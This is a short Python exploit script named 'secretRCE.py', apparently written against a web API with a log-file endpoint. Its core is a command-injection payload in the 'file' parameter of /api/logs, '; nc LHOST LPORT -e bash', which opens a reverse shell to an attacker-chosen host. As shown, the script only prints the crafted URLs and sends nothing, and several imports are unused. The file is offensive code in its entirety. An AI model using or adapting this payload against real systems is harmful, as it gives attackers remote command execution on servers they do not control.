import sys
import requests
import json
import random
import base64
import multiprocessing as mp

class Exploit(object):

        def __init__(self, url, LHOST, LPORT):
                self.url = url
                self.LHOST = LHOST
                self.LPORT = LPORT

        def exploit_api(self):
                register_url = "{0}/api/user/register".format(self.url)
                print(register_url)
                payload_url = "{0}/api/logs?file=; nc {1} {2} -e bash".format(self.url, self.LHOST, self.LPORT)
                print(payload_url)

        def helpMenu(self):
                help = "Usage: python secretRCE.py http://x.com"
                return help

if __name__ == "__main__":
        print("Secret RCE >> type `help` for help: \n")
        url = sys.argv[1]
        LHOST = sys.argv[2]
        LPORT = sys.argv[3]

        if url.endswith("/") == True:
                print("url is badly formatted. An example of a url http://example.com")
                quit()
        else:
                pass

        exploit = Exploit(url, LHOST, LPORT)
        exploit.exploit_api()
